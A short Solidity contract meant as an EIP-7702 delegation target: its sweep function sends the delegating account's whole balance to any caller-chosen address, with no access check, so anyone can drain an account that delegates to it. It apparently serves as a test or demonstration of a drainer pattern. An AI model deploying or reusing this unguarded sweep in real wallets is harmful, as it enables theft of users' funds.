// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// EIP-7702 delegation target: calling an account that delegates here sends
// the account's whole balance to `to`.
contract Sweeper {
    function sweep(address to) external {
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
